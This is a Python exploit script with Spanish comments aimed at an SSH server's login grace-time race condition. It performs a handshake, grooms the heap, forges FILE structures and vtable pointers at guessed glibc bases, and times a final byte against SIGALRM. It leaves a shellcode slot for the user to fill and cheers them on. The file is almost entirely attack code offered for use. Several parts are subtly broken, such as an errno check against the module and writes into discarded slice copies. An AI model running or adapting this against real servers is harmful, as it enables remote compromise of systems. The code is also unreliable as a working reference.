import socket
import struct
import time
import errno
import random
import os

# Tamaños máximos de los paquetes
MAX_PACKET_SIZE = 256 * 1024
# Tiempo de gracia para el inicio de sesión en segundos
LOGIN_GRACE_TIME = 120
# Máximo número de intentos de inicio
MAX_STARTUPS = 100

# Alineación de chunks
def CHUNK_ALIGN(s):
    return (s + 15) & ~15

# Posibles direcciones base de glibc (para bypass de ASLR)
GLIBC_BASES = [0xb7200000, 0xb7400000]
NUM_GLIBC_BASES = len(GLIBC_BASES)

# Placeholder de shellcode (reemplazar con shellcode real)
shellcode = b"\x90\x90\x90\x90"

def setup_connection(ip, port):
    """
    Establece una conexión TCP/IP con el servidor remoto.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        # Configura el socket en modo no bloqueante
        sock.setblocking(0)
        return sock
    except socket.error as e:
        print(f"Error al establecer conexión: {e}")
        return None

def send_packet(sock, packet_type, data):
    """
    Envía un paquete al servidor remoto.
    """
    packet_len = len(data) + 5
    packet = struct.pack(">I", packet_len) + struct.pack("B", packet_type) + data
    try:
        sock.sendall(packet)
    except socket.error as e:
        print(f"Error al enviar paquete: {e}")

def send_ssh_version(sock):
    """
    Envía la versión de SSH al servidor.
    """
    ssh_version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
    try:
        sock.sendall(ssh_version)
    except socket.error as e:
        print(f"Error al enviar versión SSH: {e}")

def receive_ssh_version(sock):
    """
    Recibe la versión de SSH del servidor.
    """
    try:
        response = sock.recv(256)
        if response:
            print(f"Versión de SSH recibida: {response.decode()}")
            return response
        else:
            print("Conexión cerrada mientras se recibía la versión de SSH")
    except socket.error as e:
        print(f"Error al recibir versión SSH: {e}")
    return None

def send_kex_init(sock):
    """
    Envía el paquete de inicialización de KEX al servidor.
    """
    kexinit_payload = bytearray(36)
    send_packet(sock, 20, kexinit_payload)

def receive_kex_init(sock):
    """
    Recibe la inicialización de KEX del servidor.
    """
    try:
        response = sock.recv(1024)
        if response:
            print(f"Inicialización KEX recibida ({len(response)} bytes)")
            return response
        else:
            print("Conexión cerrada mientras se recibía la inicialización KEX")
    except socket.error as e:
        print(f"Error al recibir inicialización KEX: {e}")
    return None

def perform_ssh_handshake(sock):
    """
    Realiza el handshake SSH completo.
    """
    send_ssh_version(sock)
    if receive_ssh_version(sock):
        send_kex_init(sock)
        if receive_kex_init(sock):
            return True
    return False

def prepare_heap(sock):
    """
    Prepara el heap del servidor con paquetes específicos.
    """
    # Paquete a: Asigna y libera chunks tcache
    for i in range(10):
        tcache_chunk = b'A' * 64
        send_packet(sock, 5, tcache_chunk)

    # Paquete b: Crea 27 pares de huecos grandes (~8KB) y pequeños (320B)
    for i in range(27):
        # Asigna chunk grande (~8KB)
        large_hole = b'B' * 8192
        send_packet(sock, 5, large_hole)

        # Asigna chunk pequeño (320B)
        small_hole = b'C' * 320
        send_packet(sock, 5, small_hole)

    # Paquete c: Escribe headers falsos, footers, vtable y punteros _codecvt
    for i in range(27):
        fake_data = bytearray(4096)
        create_fake_file_structure(fake_data, GLIBC_BASES[0])
        send_packet(sock, 5, fake_data)

    # Paquete d: Asegura que los huecos estén en los bins malloc correctos (envía ~256KB)
    large_string = b'E' * (MAX_PACKET_SIZE - 1)
    send_packet(sock, 5, large_string)

def create_fake_file_structure(data, glibc_base):
    """
    Crea una estructura de archivo falsa en los datos.
    """
    # Limpia los datos
    data[:len(data)] = b'\x00'

    # Estructura fake_file
    fake_file = {
        "_vtable_offset": 0x61,  # Establece _vtable_offset a 0x61 como se describe en el advisory
    }

    # Configura la fake vtable y los punteros _codecvt
    struct.pack_into(">Q", data, len(data) - 16, glibc_base + 0x21b740)  # vtable falsa (_IO_wfile_jumps)
    struct.pack_into(">Q", data, len(data) - 8, glibc_base + 0x21d7f8)   # _codecvt falsa

def time_final_packet(sock, parsing_time):
    """
    Mide el tiempo de respuesta final del servidor.
    """
    time_before = measure_response_time(sock, 1)
    time_after = measure_response_time(sock, 2)
    parsing_time[0] = time_after - time_before
    print(f"Tiempo estimado de análisis: {parsing_time[0]:.6f} segundos")

def measure_response_time(sock, error_type):
    """
    Mide el tiempo de respuesta para diferentes tipos de errores.
    """
    if error_type == 1:
        # Error antes de sshkey_from_blob
        error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3"
    else:
        # Error después de sshkey_from_blob
        error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9"

    start = time.monotonic()
    try:
        sock.sendall(error_packet)
        response = sock.recv(1024)
    except socket.error as e:
        print(f"Error en la medición del tiempo de respuesta: {e}")
        return 0.0
    end = time.monotonic()

    elapsed = end - start
    return elapsed

def create_public_key_packet(packet, size, glibc_base):
    """
    Crea un paquete de clave pública SSH con estructuras de archivos falsas.
    """
    # Limpia el paquete
    packet[:size] = b'\x00'

    offset = 0
    for i in range(27):
        # malloc(~4KB) - Esto es para el hueco grande
        struct.pack_into(">I", packet, offset, CHUNK_ALIGN(4096))
        offset += CHUNK_ALIGN(4096)

        # malloc(304) - Esto es para el hueco pequeño (posible estructura FILE)
        struct.pack_into(">I", packet, offset, CHUNK_ALIGN(304))
        offset += CHUNK_ALIGN(304)

    # Añade headers necesarios para el formato de clave pública SSH
    packet[:8] = b"ssh-rsa "

    # Coloca shellcode en el heap a través de las asignaciones previas
    packet[CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13:
           CHUNK_ALIGN(4096) * 14 + CHUNK_ALIGN(304) * 13] = shellcode

    # Configura las estructuras FILE falsas dentro del paquete
    for i in range(27):
        create_fake_file_structure(packet[CHUNK_ALIGN(4096) * (i + 1) +
                                          CHUNK_ALIGN(304) * i:
                                          CHUNK_ALIGN(4096) * (i + 1) +
                                          CHUNK_ALIGN(304) * (i + 1)],
                                   glibc_base)

def attempt_race_condition(sock, parsing_time, glibc_base):
    """
    Intenta explotar la condición de carrera en el servidor SSH.
    """
    final_packet = bytearray(MAX_PACKET_SIZE)
    create_public_key_packet(final_packet, len(final_packet), glibc_base)

    # Tiempo preciso para el último byte
    start = time.monotonic()
    while True:
        current = time.monotonic()
        elapsed = current - start
        if elapsed >= (LOGIN_GRACE_TIME - parsing_time[0] - 0.001):
            # 1ms antes de SIGALRM
            try:
                sock.send(final_packet[-1:])
            except socket.error as e:
                print(f"Error al enviar el último byte: {e}")
                return 0
            break

    # Verifica si la explotación fue exitosa
    response = bytearray(1024)
    try:
        received = sock.recv_into(response)
        if received > 0:
            print(f"Respuesta recibida después del intento de explotación ({received} bytes)")
            # Analiza la respuesta para determinar si se alcanzó la "gran" ventana de carrera
            if response[:8] != b"SSH-2.0-":
                print("Posible acierto en la ventana de carrera 'grande'")
                return 1
        elif received == 0:
            print("Conexión cerrada por el servidor - posible explotación exitosa")
            return 1
        elif errno == errno.EWOULDBLOCK or errno == errno.EAGAIN:
            print("No hay respuesta inmediata del servidor - posible explotación exitosa")
            return 1
        else:
            print("Error al recibir datos del servidor")
    except socket.error as e:
        print(f"Error al recibir respuesta: {e}")

    return 0

def perform_exploit(ip, port):
    """
    Realiza la explotación completa intentando varias direcciones base de glibc.
    """
    success = 0
    parsing_time = [0]
    timing_adjustment = 0

    for base_idx in range(NUM_GLIBC_BASES):
        glibc_base = GLIBC_BASES[base_idx]
        print(f"Intentando explotación con base de glibc: 0x{glibc_base:x}")

        for attempt in range(MAX_STARTUPS):
            if attempt % 1000 == 0:
                print(f"Intento {attempt} de {MAX_STARTUPS}")

            sock = setup_connection(ip, port)
            if not sock:
                print(f"Fallo al establecer conexión, intento {attempt}")
                continue

            if not perform_ssh_handshake(sock):
                print(f"Fallo de handshake SSH, intento {attempt}")
                sock.close()
                continue

            prepare_heap(sock)
            time_final_packet(sock, parsing_time)

            # Implementa la estrategia de ajuste de tiempo basada en feedback
            parsing_time[0] += timing_adjustment

            if attempt_race_condition(sock, parsing_time, glibc_base):
                print(f"Posible éxito de explotación en el intento {attempt} con base de glibc 0x{glibc_base:x}!")
                success = 1
                # En un exploit real, ahora intentaríamos interactuar con la shell

            else:
                # Ajusta el tiempo basado en el feedback
                timing_adjustment += 0.00001  # Ajuste incremental pequeño

            sock.close()
            time.sleep(0.1)  # Retraso de 100ms entre intentos, como se menciona en el aviso

    return success

# Ejemplo de uso
if __name__ == "__main__":
    ip = "127.0.0.1" #ip a atacar no olvides tu shellcode de meta
    port = 22
    exploit_successful = perform_exploit(ip, port)
    if exploit_successful:
        print("¡Explotación exitosa!, eres el mejor")
    else:
        print("No se pudo explotar la vulnerabilidad. no te rindas")
